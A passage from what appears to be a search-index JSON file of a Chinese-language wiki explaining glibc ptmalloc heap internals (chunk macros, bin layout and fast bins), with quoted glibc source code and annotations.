chunksize(p)))->mchunk_size &= ~(PREV_INUSE) \u8bbe\u7f6e chunk \u7684 size \u5b57\u6bb5 /* Set size at head, without disturbing its use bit */ // SIZE_BITS = 7 #define set_head_size(p, s) \\ ((p)->mchunk_size = (((p)->mchunk_size & SIZE_BITS) | (s))) /* Set size/use field */ #define set_head(p, s) ((p)->mchunk_size = (s)) /* Set size at footer (only when chunk is not in use) */ #define set_foot(p, s) \\ (((mchunkptr)((char *) (p) + (s)))->mchunk_prev_size = (s)) \u83b7\u53d6\u6307\u5b9a\u504f\u79fb\u7684 chunk /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) \u6307\u5b9a\u504f\u79fb\u5904 chunk \u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* check/set/clear inuse bits in known places */ #define inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size & PREV_INUSE) #define set_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size |= PREV_INUSE) #define clear_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size &= ~(PREV_INUSE))","title":"chunk \u76f8\u5173\u5b8f"},{"location":"glibc-heap/heap_structure/#bin","text":"","title":"bin \u4ecb\u7ecd"},{"location":"glibc-heap/heap_structure/#_6","text":"\u6211\u4eec\u66fe\u7ecf\u8bf4\u8fc7\uff0c\u7528\u6237\u91ca\u653e\u6389\u7684 chunk \u4e0d\u4f1a\u9a6c\u4e0a\u5f52\u8fd8\u7ed9\u7cfb\u7edf\uff0cptmalloc \u4f1a\u7edf\u4e00\u7ba1\u7406 heap \u548c mmap \u6620\u5c04\u533a\u57df\u4e2d\u7684\u7a7a\u95f2\u7684 chunk\u3002\u5f53\u7528\u6237\u518d\u4e00\u6b21\u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc \u5206\u914d\u5668\u4f1a\u8bd5\u56fe\u5728\u7a7a\u95f2\u7684 chunk \u4e2d\u6311\u9009\u4e00\u5757\u5408\u9002\u7684\u7ed9\u7528\u6237\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u964d\u4f4e\u5185\u5b58\u5206\u914d\u7684\u5f00\u9500\u3002 \u5728\u5177\u4f53\u7684\u5b9e\u73b0\u4e2d\uff0cptmalloc \u91c7\u7528\u5206\u7bb1\u5f0f\u65b9\u6cd5\u5bf9\u7a7a\u95f2\u7684 chunk \u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\uff0c\u5b83\u4f1a\u6839\u636e\u7a7a\u95f2\u7684 chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u5c06 chunk \u521d\u6b65\u5206\u4e3a 4 \u7c7b\uff1afast bins\uff0csmall bins\uff0clarge bins\uff0cunsorted bin\u3002\u6bcf\u7c7b\u4e2d\u4ecd\u7136\u6709\u66f4\u7ec6\u7684\u5212\u5206\uff0c\u76f8\u4f3c\u5927\u5c0f\u7684 chunk \u4f1a\u7528\u53cc\uff08\u5355\uff09\u5411\u94fe\u8868\u94fe\u63a5\u8d77\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6bcf\u7c7b bin \u7684\u5185\u90e8\u4ecd\u7136\u4f1a\u6709\u591a\u4e2a\u4e92\u4e0d\u76f8\u5173\u7684\u94fe\u8868\u6765\u4fdd\u5b58\u4e0d\u540c\u5927\u5c0f\u7684 chunk \u3002 \u5bf9\u4e8e small bins\uff0clarge bins\uff0cunsorted bin \u6765\u8bf4\uff0cptmalloc \u5c06\u5b83\u4eec\u7ef4\u62a4\u5728\u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u8fd9\u4e9b bin \u5bf9\u5e94\u7684\u6570\u636e\u7ed3\u6784\u5728 malloc_state \u4e2d\uff0c\u5982\u4e0b #define NBINS 128 /* Normal bins packed as described above */ mchunkptr bins[ NBINS * 2 - 2 ]; \u4e00\u4e2a bin \u76f8\u5f53\u4e8e\u4e00\u4e2a chunk \u94fe\u8868\uff0c\u6211\u4eec\u628a\u6bcf\u4e2a\u94fe\u8868\u7684\u5934\u8282\u70b9 chunk \u4f5c\u4e3a bins \u6570\u7ec4\uff0c\u4f46\u662f\u7531\u4e8e\u8fd9\u4e2a\u5934\u8282\u70b9\u4f5c\u4e3a bin \u8868\u5934\uff0c\u5176 prev_size \u4e0e size \u5b57\u6bb5\u662f\u6ca1\u6709\u4efb\u4f55\u5b9e\u9645\u4f5c\u7528\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u5b58\u50a8\u5934\u8282\u70b9 chunk \u7684\u65f6\u5019\u4ec5\u4ec5\u53ea\u9700\u8981\u5b58\u50a8\u5934\u8282\u70b9 chunk \u7684 fd \u548c bk \u5373\u53ef\uff0c\u800c\u5176\u4e2d\u7684 prev_size \u4e0e size \u5b57\u6bb5\u88ab\u91cd\u7528\u4e3a\u53e6\u4e00\u4e2a bin \u7684\u5934\u8282\u70b9\u7684 fd \u4e0e bk\uff0c\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7a7a\u95f4\uff0c\u5e76\u63d0\u9ad8\u53ef\u7528\u6027\u3002\u56e0\u6b64 \u6211\u4eec\u4ec5\u4ec5\u53ea\u9700\u8981 mchunkptr \u7c7b\u578b\u7684\u6307\u9488\u6570\u7ec4\u5c31\u8db3\u591f\u5b58\u50a8\u8fd9\u4e9b\u5934\u8282\u70b9 \uff0c\u90a3 prev_size \u4e0e size \u5b57\u6bb5\u5230\u5e95\u662f\u600e\u4e48\u91cd\u7528\u7684\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u7cfb\u7edf\u4e3a\u4f8b \u542b\u4e49 bin1 \u7684 fd/bin2 \u7684 prev_size bin1 \u7684 bk/bin2 \u7684 size bin2 \u7684 fd/bin3 \u7684 prev_size bin2 \u7684 bk/bin3 \u7684 size bin \u4e0b\u6807 0 1 2 3 \u53ef\u4ee5\u770b\u51fa\u9664\u4e86\u7b2c\u4e00\u4e2a bin\uff08unsorted bin\uff09\u5916\uff0c\u540e\u9762\u7684\u6bcf\u4e2a bin \u7684\u8868\u5934 chunk \u4f1a\u91cd\u7528\u524d\u9762\u7684 bin \u8868\u5934 chunk \u7684 fd \u4e0e bk \u5b57\u6bb5\uff0c\u5c06\u5176\u89c6\u4e3a\u5176\u81ea\u8eab\u7684 prev_size \u548c size \u5b57\u6bb5\u3002\u8fd9\u91cc\u4e5f\u8bf4\u660e\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c bin \u7684\u4e0b\u6807\u548c\u6211\u4eec\u6240\u8bf4\u7684\u7b2c\u51e0\u4e2a bin \u5e76\u4e0d\u662f\u4e00\u81f4\u7684\u3002\u540c\u65f6\uff0cbin \u8868\u5934\u7684 chunk \u5934\u8282\u70b9 \u7684 prev_size \u4e0e size \u5b57\u6bb5\u4e0d\u80fd\u968f\u4fbf\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u5176\u5b83 bin \u8868\u5934 chunk \u7684 fd \u548c bk \u5b57\u6bb5\u3002 \u6570\u7ec4\u4e2d\u7684 bin \u4f9d\u6b21\u4ecb\u7ecd\u5982\u4e0b \uff08\u7d22\u5f15\uff09\u7b2c\u4e00\u4e2a\u4e3a unsorted bin\uff0c\u5b57\u5982\u5176\u9762\uff0c\u8fd9\u91cc\u9762\u7684 chunk \u6ca1\u6709\u8fdb\u884c\u6392\u5e8f\uff0c\u5b58\u50a8\u7684 chunk \u6bd4\u8f83\u6742\u3002 \u7d22\u5f15\u4ece 2 \u5230 63 \u7684 bin \u79f0\u4e3a small bin\uff0c\u540c\u4e00\u4e2a small bin \u94fe\u8868\u4e2d\u7684 chunk \u7684\u5927\u5c0f\u76f8\u540c\u3002\u4e24\u4e2a\u76f8\u90bb\u7d22\u5f15\u7684 small bin \u94fe\u8868\u4e2d\u7684 chunk \u5927\u5c0f\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e3a 2 \u4e2a\u673a\u5668\u5b57\u957f \uff0c\u5373 32 \u4f4d\u76f8\u5dee 8 \u5b57\u8282\uff0c64 \u4f4d\u76f8\u5dee 16 \u5b57\u8282\u3002 small bins \u540e\u9762\u7684 bin \u88ab\u79f0\u4f5c large bins\u3002large bins \u4e2d\u7684\u6bcf\u4e00\u4e2a bin \u90fd\u5305\u542b\u4e00\u5b9a\u8303\u56f4\u5185\u7684 chunk\uff0c\u5176\u4e2d\u7684 chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\u3002\u76f8\u540c\u5927\u5c0f\u7684 chunk \u540c\u6837\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\u3002 \u5728 glibc \u4e2d\u7528\u4e8e\u8bb0\u5f55 bin \u7684\u6570\u636e\u7ed3\u6784\u6709\u4e24\u79cd\uff0c\u5206\u522b\u4e3a\uff1a fastbinsY : \u8fd9\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u7528\u4e8e\u8bb0\u5f55\u6240\u6709\u7684 fast bin bin \u6570\u7ec4: \u8fd9\u4e5f\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u7528\u4e8e\u8bb0\u5f55\u9664 fast bin \u4e4b\u5916\u7684\u6240\u6709 bin \u3002\u4e8b\u5b9e\u4e0a\u8fd9\u4e2a\u6570\u7ec4\u5171\u6709 126 \u4e2a\u5143\u7d20\uff0c\u5206\u522b\u662f: [1] \u4e3a unsorted bin [2~63] \u4e3a small bin [64~126] \u4e3a large bin \u56de\u987e malloc_chunk \u7684\u6570\u636e\u7ed3\u6784\uff0c\u5176\u4e2d\u7684 fd \u548c bk \u6307\u9488\u5c31\u662f\u6307\u5411\u5f53\u524d chunk \u6240\u5c5e\u7684\u94fe\u8868\u4e2d forward chunk \u6216\u8005 backward chunk \uff0c \u56e0\u6b64\u4e00\u822c\u7684 bin \u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868 \uff08\u6709\u4f8b\u5916\uff09\u3002 \u6b64\u5916\uff0c\u4e0a\u8ff0\u8fd9\u4e9b bin \u7684\u6392\u5e03\u90fd\u4f1a\u9075\u5faa\u4e00\u4e2a\u539f\u5219\uff1a \u4efb\u610f\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u4e0d\u80fd\u5728\u4e00\u8d77 \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684 chunk \u88ab\u91ca\u653e\u540e\u5c31\u7acb\u5373\u88ab\u653e\u5230 bin \u4e2d\u3002ptmalloc \u4e3a\u4e86\u63d0\u9ad8\u5206\u914d\u7684\u901f\u5ea6\uff0c\u4f1a\u628a\u4e00\u4e9b\u5c0f\u7684 chunk \u5148 \u653e\u5230 fast bins \u7684\u5bb9\u5668\u5185\u3002 \u800c\u4e14\uff0cfastbin \u5bb9\u5668\u4e2d\u7684 chunk \u7684\u4f7f\u7528\u6807\u8bb0\u603b\u662f\u88ab\u7f6e\u4f4d\u7684\uff0c\u6240\u4ee5\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u539f\u5219\u3002 bin \u901a\u7528\u7684\u5b8f\u5982\u4e0b typedef struct malloc_chunk *mbinptr; /* addressing -- note that bin_at(0) does not exist */ #define bin_at(m, i) \\ (mbinptr)(((char *) &((m)->bins[ ((i) -1) * 2 ])) - \\ offsetof(struct malloc_chunk, fd)) /* analog of ++bin */ //\u83b7\u53d6\u4e0b\u4e00\u4e2abin\u7684\u5730\u5740 #define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1))) /* Reminders about list directionality within bins */ // \u8fd9\u4e24\u4e2a\u5b8f\u53ef\u4ee5\u7528\u6765\u904d\u5386bin // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5934\u7684 chunk #define first(b) ((b)->fd) // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5c3e\u7684 chunk #define last(b) ((b)->bk)","title":"\u6982\u8ff0"},{"location":"glibc-heap/heap_structure/#fast-bin","text":"\u5927\u591a\u6570\u7a0b\u5e8f\u7ecf\u5e38\u4f1a\u7533\u8bf7\u4ee5\u53ca\u91ca\u653e\u4e00\u4e9b\u6bd4\u8f83\u5c0f\u7684\u5185\u5b58\u5757\u3002\u5982\u679c\u5c06\u4e00\u4e9b\u8f83\u5c0f\u7684 chunk \u91ca\u653e\u4e4b\u540e\u53d1\u73b0\u5b58\u5728\u4e0e\u4e4b\u76f8\u90bb\u7684\u7a7a\u95f2\u7684 chunk \u5e76\u5c06\u5b83\u4eec\u8fdb\u884c\u5408\u5e76\uff0c\u90a3\u4e48\u5f53\u4e0b\u4e00\u6b21\u518d\u6b21\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u5c31\u9700\u8981\u5bf9 chunk \u8fdb\u884c\u5206\u5272\uff0c\u8fd9\u6837\u5c31\u5927\u5927\u964d\u4f4e\u4e86\u5806\u7684\u5229\u7528\u6548\u7387\u3002 \u56e0\u4e3a\u6211\u4eec\u628a\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u4e86\u5408\u5e76\u3001\u5206\u5272\u4ee5\u53ca\u4e2d\u95f4\u68c0\u67e5\u7684\u8fc7\u7a0b\u4e2d\u3002 \u56e0\u6b64\uff0cptmalloc \u4e2d\u4e13\u95e8\u8bbe\u8ba1\u4e86 fast bin\uff0c\u5bf9\u5e94\u7684\u53d8\u91cf\u5c31\u662f malloc state \u4e2d\u7684 fastbinsY /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn't much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ typedef struct malloc_chunk *mfastbinptr; /* This is in malloc_state. /* Fastbins */ mfastbinptr fastbinsY[ NFASTBINS ]; */ \u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u5229\u7528 fast bin\uff0cglibc \u91c7\u7528 \u5355\u5411\u94fe\u8868 \u5bf9\u5176\u4e2d\u7684\u6bcf\u4e2a bin \u8fdb\u884c\u7ec4\u7ec7(\u53ea\u4f7f\u7528 fd \u6307\u9488)\uff0c\u5e76\u4e14 \u6bcf\u4e2a bin \u91c7\u53d6 LIFO \u7b56\u7565\uff08\u540e\u8fdb\u5148\u51fa\uff09 \uff0c\u6700\u8fd1\u91ca\u653e\u7684 chunk \u4f1a\u66f4\u65e9\u5730\u88ab\u5206\u914d\uff0c\u6240\u4ee5\u4f1a\u66f4\u52a0\u9002\u5408\u4e8e\u5c40\u90e8\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u7528\u6237\u9700\u8981\u7684 chunk \u7684\u5927\u5c0f\u5c0f\u4e8e fastbin \u7684\u6700\u5927\u5927\u5c0f\u65f6\uff0c ptmalloc \u4f1a\u9996\u5148\u5224\u65ad fastbin \u4e2d\u76f8\u5e94\u7684 bin \u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u5927\u5c0f\u7684\u7a7a\u95f2\u5757\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u76f4\u63a5\u4ece\u8fd9\u4e2a bin \u4e2d\u83b7\u53d6 chunk\u3002\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0cptmalloc \u624d\u4f1a\u505a\u63a5\u4e0b\u6765\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002 fast bin \u4e2d\u65e0\u8bba\u662f\u6dfb\u52a0\u8fd8\u662f\u79fb\u9664 fast chunk \uff0c\u90fd\u662f\u5bf9\u201c\u94fe\u8868\u5c3e\u201d\u8fdb\u884c\u64cd\u4f5c\uff0c\u800c\u4e0d\u4f1a\u5bf9\u67d0\u4e2a\u4e2d\u95f4\u7684 fast chunk \u8fdb\u884c\u64cd\u4f5c\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08 32 \u4f4d\u7cfb\u7edf\u4e3a\u4f8b \uff09\uff0c fastbin \u4e2d\u9ed8\u8ba4\u652f\u6301\u6700\u5927\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002\u4f46\u662f\u5176\u53ef\u4ee5\u652f\u6301\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u6700\u5927\u4e3a 80 \u5b57\u8282\u3002\u9664\u6b64\u4e4b\u5916\uff0c fastbin \u6700\u591a\u53ef\u4ee5\u652f\u6301\u7684 bin \u7684\u4e2a\u6570\u4e3a 10 \u4e2a \uff0c\u4ece\u6570\u636e\u7a7a\u95f4\u4e3a 8 \u5b57\u8282\u5f00\u59cb\u4e00\u76f4\u5230 80 \u5b57\u8282\uff08\u6ce8\u610f\u8fd9\u91cc\u8bf4\u7684\u662f\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\uff0c\u4e5f\u5373\u9664\u53bb prev_size \u548c size \u5b57\u6bb5\u90e8\u5206\u7684\u5927\u5c0f\uff09\u5b9a\u4e49\u5982\u4e0b\uff1a #define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1) #ifndef DEFAULT_MXFAST #define DEFAULT_MXFAST (64 * SIZE_SZ / 4) #endif /* The maximum fastbin request size we support */ #define MAX_FAST_SIZE (80 * SIZE_SZ / 4) /* Since the lowest 2 bits in max_fast don't matter in size comparisons, they are used as flags. */ /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ //\u5224\u65ad\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk\uff0c1\u8868\u793a\u6ca1\u6709 #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ // MORECORE\u662f\u5426\u8fd4\u56de\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002 // \u4e3b\u5206\u914d\u533a\u4e2d\u7684MORECORE\u5176\u5b9e\u4e3asbr()\uff0c\u9ed8\u8ba4\u8fd4\u56de\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4 // \u975e\u4e3b\u5206\u914d\u533a\u4f7f\u7528mmap()\u5206\u914d\u5927\u5757\u865a\u62df\u5185\u5b58\uff0c\u7136\u540e\u8fdb\u884c\u5207\u5206\u6765\u6a21\u62df\u4e3b\u5206\u914d\u533a\u7684\u884c\u4e3a // \u800c\u9ed8\u8ba4\u60c5\u51b5\u4e0bmmap\u6620\u5c04\u533a\u57df\u662f\u4e0d\u4fdd\u8bc1\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8fde\u7eed\u7684\uff0c\u6240\u4ee5\u975e\u4e3b\u5206\u914d\u533a\u9ed8\u8ba4\u5206\u914d\u975e\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002 #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) /* Set value of max_fast. Use impossibly small value if 0. Precondition: there are no existing fastbin chunks. Setting the value clears fastchunk bit but preserves noncontiguous bit. */ #define set_max_fast(s) \\ global_max_fast = \\ (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) & ~MALLOC_ALIGN_MASK)) #define get_max_fast() global_max_fast ptmalloc \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8c03\u7528 set_max_fast(s) \u5c06\u5168\u5c40\u53d8\u91cf global_max_fast \u8bbe\u7f6e\u4e3a DEFAULT_MXFAST\uff0c\u4e5f\u5c31\u662f\u8bbe\u7f6e fast bins \u4e2d chunk \u7684\u6700\u5927\u503c\u3002\u5f53 MAX_FAST_SIZE \u88ab\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u7cfb\u7edf\u5c31\u4e0d\u4f1a\u652f\u6301 fastbin \u3002 \u90a3\u4e48 malloc \u64cd\u4f5c\u5177\u4f53\u5982\u4f55\u5904\u7406 fast chunk \u5462\uff1f \u5f53\u7528\u6237\u901a\u8fc7 malloc \u8bf7\u6c42\u7684\u5927\u5c0f\u5c5e\u4e8e fast chunk \u7684\u5927\u5c0f\u8303\u56f4\uff08\u6ce8\u610f\uff1a\u7528\u6237\u8bf7\u6c42 size \u52a0\u4e0a 16 \u5b57\u8282\u5c31\u662f\u5b9e\u9645\u5185\u5b58 chunk size \uff09\u3002\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019 fast bin \u652f\u6301\u7684\u6700\u5927\u5185\u5b58\u5927\u5c0f\u4ee5\u53ca\u6240\u6709 fast bin \u94fe\u8868\u90fd\u662f\u7a7a\u7684\uff0c\u6240\u4ee5\u5f53\u6700\u5f00\u59cb\u4f7f\u7528 malloc \u7533\u8bf7\u5185\u5b58\u7684\u65f6\u5019\uff0c\u5373\u4f7f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5c5e\u4e8e fast chunk \u7684\u5185\u5b58\u5927\u5c0f\uff08\u5373 16 \u5230 80 \u5b57\u8282\uff09\uff0c\u5b83\u4e5f\u4e0d\u4f1a\u4ea4\u7531 fast bin \u6765\u5904\u7406\uff0c\u800c\u662f\u5411\u4e0b\u4f20\u9012\u4ea4\u7531 small bin \u6765\u5904\u7406\uff0c\u5982\u679c small bin \u4e5f\u4e3a\u7a7a\u7684\u8bdd\u5c31\u4ea4\u7ed9 unsorted bin \u5904\u7406\u3002\u90a3\u4e48 fast bin \u662f\u5728\u54ea\uff1f\u600e\u4e48\u8fdb\u884c\u521d\u59cb\u5316\u7684\u5462\uff1f \u5f53\u6211\u4eec\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u6267\u884c _int_malloc \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u9996\u5148\u4f1a\u53d1\u73b0\u5f53\u524d fast bin \u4e3a\u7a7a\uff0c\u5c31\u8f6c\u4ea4\u7ed9 small bin \u5904\u7406\uff0c\u8fdb\u800c\u53c8\u53d1\u73b0 small bin \u4e5f\u4e3a\u7a7a\uff0c\u5c31\u8c03\u7528 malloc_consolidate \u51fd\u6570\u5bf9 malloc_state \u7ed3\u6784\u4f53\u8fdb\u884c\u521d\u59cb\u5316\uff0c malloc_consolidate \u51fd\u6570\u4e3b\u8981\u5b8c\u6210\u4ee5\u4e0b\u51e0\u4e2a\u529f\u80fd\uff1a \u9996\u5148\u5224\u65ad\u5f53\u524d malloc_state \u7ed3\u6784\u4f53\u4e2d\u7684 fast bin \u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e3a\u7a7a\u5c31\u8bf4\u660e\u6574\u4e2a malloc_state \uff08 arena \uff09\u90fd\u6ca1\u6709\u5b8c\u6210\u521d\u59cb\u5316\uff0c\u9700\u8981\u5bf9 malloc_state \u8fdb\u884c\u521d\u59cb\u5316\u3002 malloc_state \u7684\u521d\u59cb\u5316\u64cd\u4f5c\u7531\u51fd\u6570 malloc_init_state(av) \u5b8c\u6210\uff0c\u8be5\u51fd\u6570\u5148\u521d\u59cb\u5316\u9664 fast bin \u4e4b\u5916\u7684\u6240\u6709\u7684 bin (\u6784\u5efa\u53cc\u94fe\u8868\uff0c\u8be6\u60c5\u89c1\u540e\u6587 small bins \u4ecb\u7ecd)\uff0c\u518d\u521d\u59cb\u5316 fast bins \u3002 \u5f53\u518d\u6b21\u6267\u884c malloc \u51fd\u6570\u7684\u65f6\u5019\uff0c\u6b64\u65f6 fast bin \u76f8\u5173\u6570\u636e\u4e0d\u4e3a\u7a7a\u4e86\uff0c\u5c31\u5f00\u59cb\u4f7f\u7528 fast bin \uff0c\u8fd9\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a static void * _int_malloc (mstate av, size_t bytes) { // \u2026 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ //\u7b2c\u4e00\u6b21\u6267\u884cmalloc(fast chunk)\u65f6\u8fd9\u91cc\u5224\u65ad\u4e3afalse\uff0c\u56e0\u4e3a\u6b64\u65f6get_max_fast ()\u4e3a0 if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ())) { // use fast bin idx = fastbin_index (nb); mfastbinptr *fb = &fastbin (av, idx); mchunkptr pp = *fb; do { victim = pp; if (victim == NULL) break; } // remove chunk from fast bin while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))!= victim); if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim)); return NULL; } check_remalloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } \u5f97\u5230\u7b2c\u4e00\u4e2a\u6765\u81ea\u4e8e fast bin \u7684 chunk \u4e4b\u540e\uff0c\u7cfb\u7edf\u5c31\u5c06\u8be5 chunk \u4ece\u5bf9\u5e94\u7684 fast bin \u4e2d\u79fb\u9664\uff0c\u5e76\u5c06\u5176\u5730\u5740\u8fd4\u56de\u7ed9\u7528\u6237\u3002 fastbin \u7684\u7d22\u5f15 #define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[ idx ]) /* offset 2 to use otherwise unindexable first 2 bins */ // chunk size=2*size_sz*(2+idx) // \u8fd9\u91cc\u8981\u51cf2\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u524d\u4e24\u4e2abin\u6ca1\u6709\u529e\u6cd5\u7d22\u5f15\u5230\u3002 #define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) \u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cfastbin \u8303\u56f4\u7684 chunk \u7684 inuse \u59cb\u7ec8\u88ab\u7f6e\u4e3a 1\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u548c\u5176\u5b83\u88ab\u91ca\u653e\u7684 chunk \u5408\u5e76\u3002 \u4f46\u662f\u5f53\u91ca\u653e\u7684 chunk \u4e0e\u8be5 chunk \u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5408\u5e76\u540e\u7684\u5927\u5c0f\u5927\u4e8e FASTBIN_CONSOLIDATION_THRESHOLD \u65f6\uff0c\u5185\u5b58\u788e\u7247\u53ef\u80fd\u6bd4\u8f83\u591a\u4e86\uff0c\u6211\u4eec\u5c31\u9700\u8981\u628a fast bins \u4e2d\u7684 chunk \u90fd\u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247\u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd\u3002 /* FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() that triggers automatic consolidation of possibly-surrounding fastbin chunks. This is a heuristic, so the exact value should not matter too much. It is defined at half the default trim threshold as a compromise heuristic to only attempt consolidation if it is likely to lead to trimming. However, it is not dynamically tunable, since consolidation reduces fragmentation surrounding large chunks even if trimming is not used. */ #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) malloc_consolidate \u51fd\u6570\u53ef\u4ee5\u5c06 fastbin \u4e2d\u6240\u6709\u80fd\u548c\u5176\u5b83 chunk \u5408\u5e76\u7684 chunk \u5408\u5e76\u5728\u4e00\u8d77\u3002\u5177\u4f53\u5730\u53c2\u89c1\u540e\u7eed\u7684\u8be6\u7ec6\u51fd\u6570\u7684\u5206\u6790\u3002 /* Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */","title":"Fast Bin"},{"location":"glibc-heap/heap_structure/#small-bin","text":"small bins \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0e\u5176\u6240\u5728\u7684 bin \u7684 index \u7684\u5173\u7cfb\u4e3a\uff1achunk_size = 2 * SIZE_SZ 